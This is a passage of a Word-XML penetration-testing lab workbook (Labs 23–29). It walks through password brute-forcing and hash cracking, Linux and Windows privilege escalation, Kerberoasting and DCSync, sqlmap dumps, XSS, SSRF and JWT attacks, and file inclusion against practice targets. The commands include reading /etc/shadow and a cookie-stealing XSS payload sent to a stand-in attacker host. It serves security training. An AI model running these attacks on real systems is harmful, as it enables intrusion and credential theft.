        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>hydra -l admin -P rockyou-1k.txt $TARGET http-post-form "/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=Login failed"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Build a custom wordlist by spidering the site</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>cewl -d 2 -m 5 -w cewl.txt http://$TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run a credential-stuffing attack from a combo list</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>hydra -C combo.txt ssh://$TARGET</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Hydra reports a valid msfadmin:msfadmin login for the SSH service.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labs/lab-23-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 24 — Offline Hash Cracking with hashcat and John</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 4.3 Brute force, dictionary, mask, password spraying — offline tools hashcat and John the Ripper..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner identifies hash types then cracks them offline using hashcat attack modes and John the Ripper.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Cracked plaintext passwords for MD5, NTLM and archive hashes.   (Tools: hashcat, John the Ripper, hashid, zip2john.)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Identify the hash types in the sample bank</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>hashid -m hashes.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run a straight dictionary attack with hashcat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Apply mangling rules to the wordlist</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run a targeted mask brute-force attack</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>hashcat -m 1000 -a 3 ntlm.txt '?u?l?l?l?l?l?d?d'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run a hybrid dictionary-plus-mask attack</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>hashcat -m 0 -a 6 hashes.txt rockyou.txt '?d?d?d?d'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Crack NTLM hashes with John the Ripper</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Extract and crack a ZIP archive hash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>zip2john /tmp/file.zip &gt; zip.hash; john --wordlist=rockyou.txt zip.hash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Show the cracked passwords</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>john --show --format=NT hashes.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>hashcat and John reveal the plaintext for the MD5 and NTLM hashes.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labs/lab-24-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 25 — Linux Privilege Escalation with LinPEAS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 4.4 Privilege escalation, credential dumping, misconfigured endpoints, LOLbins, shell escape..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner enumerates a low-privileged Linux shell with LinPEAS and escalates to root via a sudo misconfiguration and a SUID binary.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A root shell from a GTFOBins sudo entry and a PATH-hijacked SUID binary.   (Tools: LinPEAS, GTFOBins, pspy, searchsploit.)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Enumerate sudo rights and SUID binaries manually</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo -l; find / -perm -4000 -type f 2&gt;/dev/null</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Download and run LinPEAS on the target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/tmp/linpeas.sh -a | tee linpeas.out</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Escape to root via a sudo GTFOBins entry</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo find . -exec /bin/sh \; -quit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Inspect a suspicious SUID binary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>strings /usr/local/bin/backup | head</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Hijack PATH to exploit a relative-call SUID binary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>echo -e '#!/bin/sh\n/bin/sh' &gt; /tmp/tar; chmod +x /tmp/tar; export PATH=/tmp:$PATH</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Search for a matching kernel exploit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>searchsploit "Linux Kernel 4.4"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Dump credentials after escalation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo cat /etc/shadow &gt; shadow.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Watch for root cron jobs with pspy</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>./pspy -pf -i 1000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Running id after the exploit returns uid=0(root).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labs/lab-25-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 26 — Windows Privilege Escalation and Kerberoasting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 4.3 Kerberos attacks, LDAP injection, pass-the-hash/ticket; 4.4 Privilege escalation, credential dumping, mimikatz, BloodHound..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner maps an Active Directory domain with BloodHound, Kerberoasts a service account, and moves laterally via pass-the-hash to a domain dump.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Cracked service-account credentials and a domain-wide NTDS dump obtained via DCSync.   (Tools: BloodHound, impacket-GetUserSPNs, hashcat, crackmapexec, evil-winrm, impacket-secretsdump.)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Collect AD data with BloodHound.py</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>bloodhound-python -u bob -p Spring2026 -d corp.local -ns 10.0.0.5 -c All</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Request Kerberoastable SPN hashes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>impacket-GetUserSPNs corp.local/bob:Spring2026 -dc-ip 10.0.0.5 -request -outputfile spns.hash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Crack the TGS hashes offline</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>hashcat -m 13100 spns.hash /usr/share/wordlists/rockyou.txt -r best64.rule</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>AS-REP roast pre-auth-disabled accounts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.5 -format hashcat -outputfile asrep.hash</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Enumerate local privesc with WinPEAS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.\winpeas.exe quiet cmd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Validate cracked creds across the domain (PtH)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>crackmapexec smb 10.0.0.0/24 -u svc_sql -p 'Summer2025' --shares</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Get an interactive shell with evil-winrm</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>evil-winrm -i 10.0.0.20 -u svc_sql -p 'Summer2025'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>DCSync every domain hash as Domain Admin</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>impacket-secretsdump corp.local/da:Pass@10.0.0.5 -just-dc -outputfile dc.dump</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>hashcat cracks a service-account hash and secretsdump exports every domain NTLM hash.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labs/lab-26-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 27 — SQL Injection with sqlmap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 4.5 Injection attacks — SQL injection..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner exploits SQL injection in DVWA manually then automates full database extraction with sqlmap.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>A complete dump of the DVWA users table including the admin password hash.   (Tools: sqlmap, DVWA, Burp Suite, Docker.)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Launch the DVWA target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo docker run --rm -d --name dvwa -p 80:80 vulnerables/web-dvwa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Confirm injection with a manual UNION query</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?id=1' UNION SELECT user,password FROM users-- -</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Export the session cookie and target URL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>COOKIE="PHPSESSID=abc; security=low"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Run sqlmap discovery against the endpoint</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sqlmap -u "$URL" --cookie="$COOKIE" --batch</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Enumerate databases, tables and columns</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sqlmap -u "$URL" --cookie="$COOKIE" --batch -D dvwa -T users --columns</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Dump the users table</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sqlmap -u "$URL" --cookie="$COOKIE" --batch -D dvwa -T users --dump</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Tune risk/level and bypass a simple WAF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sqlmap -u "$URL" --cookie="$COOKIE" --risk=3 --level=5 --batch</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Feed a Burp-saved raw request to sqlmap</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sqlmap -r request.txt --batch</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>sqlmap dumps the DVWA users table and reveals the admin MD5 hash.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labs/lab-27-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 28 — XSS, CSRF and SSRF with Burp Suite</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 4.5 Web app attacks — XSS, CSRF, SSRF, JWT manipulation, session hijacking..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner uses Burp Suite to find stored XSS, forge a CSRF request, and trigger SSRF against OWASP Juice Shop.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Working XSS, CSRF and SSRF proof-of-concepts plus a cracked JWT secret.   (Tools: Burp Suite, OWASP Juice Shop, XSStrike, jwt_tool, hashcat.)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Launch OWASP Juice Shop</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo docker run --rm -d --name juice -p 3000:3000 bkimminich/juice-shop</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Inject a stored XSS payload into the search bar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>&lt;iframe src="javascript:alert(`xss`)"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Steal cookies with a reflected XSS payload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>&lt;script&gt;fetch('https://attacker/?c='+document.cookie)&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Fuzz DOM XSS contexts with XSStrike</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>xsstrike -u 'http://127.0.0.1:3000/#/search?q=test'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Forge a state-changing CSRF proof-of-concept form</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Trigger SSRF to the cloud metadata endpoint</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>http://localhost:3000/redirect?to=http://169.254.169.254/latest/meta-data/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Tamper the JWT with jwt_tool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>jwt_tool eyJhbGciOiJIUzI1... -X k -k public.pem</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Crack the JWT signature offline</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Test it</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The XSS alert fires, the SSRF returns metadata, and hashcat recovers the JWT signing secret.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labs/lab-28-*.md. Only run these techniques against systems you own or are authorised to test.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Lab 29 — File Inclusion, Directory Traversal and Web Shells</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Exam objective: 4.5 File inclusion (LFI/RFI), directory traversal, web shell; 5.1 Backdoor — web shell..</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Goal: The learner exploits LFI and RFI in DVWA, escalates LFI to RCE via log poisoning, and drops a stealthy web shell.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="1F6FEB"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>What you'll build</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>An RCE web shell obtained through LFI log poisoning and RFI.   (Tools: DVWA, curl, weevely, Python http.server.)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Launch the DVWA target</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>sudo docker run --rm -d --name dvwa -p 80:80 vulnerables/web-dvwa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Read arbitrary files via directory traversal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>http://127.0.0.1/vulnerabilities/fi/?page=../../../../etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Read PHP source with the php filter wrapper</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="0B3060"/>
          <w:sz w:val="19"/>
        </w:rPr>
